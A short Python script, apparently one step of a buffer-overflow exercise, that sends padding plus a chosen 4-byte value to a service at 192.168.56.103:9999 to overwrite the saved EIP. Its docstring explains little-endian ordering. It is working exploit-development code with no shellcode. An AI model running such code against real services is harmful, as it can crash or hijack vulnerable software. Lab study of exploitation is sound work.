''' overwrite_eip.py: precisely overwrites the EIP using the given offset

This script is a demonstration that we can control the EIP with precision, writing exactly the payload
of our choosing (in this case, "AABB") into the EIP. 

Note: the EIP is 4 bytes long. The last 4 chars you send will overwrite into the EIP.

For example;

pattern = b"A" * offset + b"AABB"

Sending this payoad, b"AABB", results in an EIP of "42424141" due to little endian, lowest-byte-first x86 architecture
... meaning, the lowest bytes of BB (each of which is \x42) come before the higher bytes of AA (each of which is \x41)
... generally little endian is the reverse of how we normally write numbers

'''

import sys, socket, subprocess
host = "192.168.56.103"
port = 9999

# user input - data from last step in the bof process
offset = int(input("> Input the exact offset (from find_offset.py): ")) 
payload = bytes(input("> Input desired 4-byte payload: "), "utf-8")
assert(len(payload) == 4), "Payload must be exactly four bytes long (e.g. ABCD)"

# precisely overwrite the offset
pattern = b"A"*offset + payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    # connect 
    s.connect((host, port))
    s.recv(1024)
    # send pattern to target
    s.sendall(pattern)
    print("Sent")
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
